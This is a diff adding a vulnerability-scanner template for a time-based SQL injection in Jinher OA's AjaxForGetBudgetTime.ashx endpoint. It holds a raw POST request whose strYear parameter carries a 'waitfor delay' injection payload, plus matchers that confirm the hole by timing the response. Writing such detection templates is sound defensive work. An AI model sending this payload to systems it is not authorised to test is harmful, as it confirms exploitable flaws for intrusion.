@@ -1,0 +1,40 @@
+id: jinher-jhsoft-ajaxforgetbudgettime-ashx-sqli
+info:
+  name: Jinher OA AjaxForGetBudgetTime.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getTime&strTime=&strYear=1'waitfor+delay%270:0:{{t1}}%27--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "全部"
+          - "option"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "<html"
+        condition: or
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
